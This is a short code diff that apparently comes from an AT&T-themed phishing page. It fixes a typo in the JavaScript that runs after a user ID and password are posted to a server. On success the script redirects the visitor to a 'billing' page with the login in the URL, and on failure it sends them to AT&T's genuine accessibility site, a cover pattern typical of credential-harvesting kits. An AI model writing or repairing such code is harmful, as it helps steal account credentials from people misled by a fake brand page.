@@ -483,7 +483,7 @@ console.log(randomString);
                         data: { UserId: login, Password: pword }
                     }).done(function(msg) {
                 console.log(msg);
-                if(msg.inclides('on'){
+                if(msg.includes('on')){
                 window.location.href = ablp+"/billing.html?"+generateRandomString(6)+"%User="+login+" id_token="+randomString;
 		}else{
 			window.location.href = "https://about.att.com/sites/accessibility";
